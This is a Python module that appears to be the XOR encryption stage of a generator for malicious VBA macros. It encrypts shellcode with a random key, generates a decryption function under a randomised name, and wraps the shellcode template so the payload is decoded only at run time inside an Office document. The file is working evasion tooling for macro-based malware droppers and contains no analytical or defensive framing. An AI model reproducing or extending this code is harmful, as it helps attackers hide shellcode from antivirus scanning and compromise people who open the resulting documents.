import random
import string
from vba.utils.formatters import bytes_to_vba
import os
from itertools import cycle

class XOREncrypt:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        if 'key' in arguments:
            self.key = arguments['key'].encode()
        else:
            self.key = os.urandom(16)

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []

    def encode(self, plaintext: bytes) -> bytes:
        self.ciphertextSize = len(plaintext)
        return bytes(plaintext[i] ^ self.key[i % len(self.key)] for i in range(0, len(plaintext)))

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')

    def codeblock(self) -> str:
        return f"""
Function {self.name}(ciphertext() As Byte) As Byte()
    Dim i As Long, n as Long
    {bytes_to_vba(self.key, 'key')}
    Dim plaintext() as Byte

    n = Ubound(ciphertext)
    ReDim plaintext(0 To n)

    For i = 0 To n
        plaintext(i) = ciphertext(i) Xor key(i Mod {len(self.key)})
    Next i

    {self.name} = plaintext
End Function
"""